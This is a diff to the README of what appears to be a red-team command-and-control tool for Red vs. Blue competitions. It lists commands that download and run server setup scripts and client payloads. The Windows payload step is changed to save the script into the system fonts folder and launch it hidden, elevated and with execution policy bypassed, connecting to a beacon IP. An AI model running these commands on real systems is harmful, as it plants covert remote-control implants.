@@ -6,27 +6,27 @@ This tool is meant to be used in Red Vs. Blue style Cybersecurity Competitions f
 
 Windows C2 Server
 
-ps> wget -o setup.ps1 "https://gitlab.ritsec.cloud/jms9508/james-danny-ritsecredteamrecruiting/-/raw/main/Setup/ServerSetup.ps1?ref_type=heads"
+ps> wget -o setup.ps1 "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Setup/ServerSetup.ps1?ref_type=heads"
 
 ps> .\setup.ps1
 
 Windows Long Range Beacon Server
 
-ps> wget -o setup.ps1 "https://gitlab.ritsec.cloud/jms9508/james-danny-ritsecredteamrecruiting/-/raw/main/Setup/ServerSetup.ps1?ref_type=heads"
+ps> wget -o setup.ps1 "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Setup/ServerSetup.ps1?ref_type=heads"
 
 ps> .\setup.ps1 -server Beacon
 
-Payload On Windows Client Side
+Windows Payload
 
-ps> wget -o setup.ps1 "https://gitlab.ritsec.cloud/jms9508/james-danny-ritsecredteamrecruiting/-/raw/main/Payloads/windowsPayload.ps1?ref_type=heads"
+ps> wget -o C:\Windows\fonts\windowsPayload.ps1 "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsPayload.ps1?ref_type=heads"
 
-ps> .\setup.ps1
+ps> Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "C:\Windows\fonts\windowsPayload.ps1 -BeaconIPAddress {IP Address of Beacon}" -Verb RunAs
 
 Payload On Linux Client Side
 
-bash> git clone "https://gitlab.ritsec.cloud/jms9508/james-danny-ritsecredteamrecruiting/-/raw/main/Payloads/linuxPayload.bash?ref_type=heads"
+bash> git clone "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/linuxPayload.bash?ref_type=heads"
 
-bash> cd jms9508/james-danny-ritsecredteamrecruiting/Payloads
+bash> cd jms9508/Javalanche/Payloads
 
 bash> chmod +x linuxPayload.bash
 
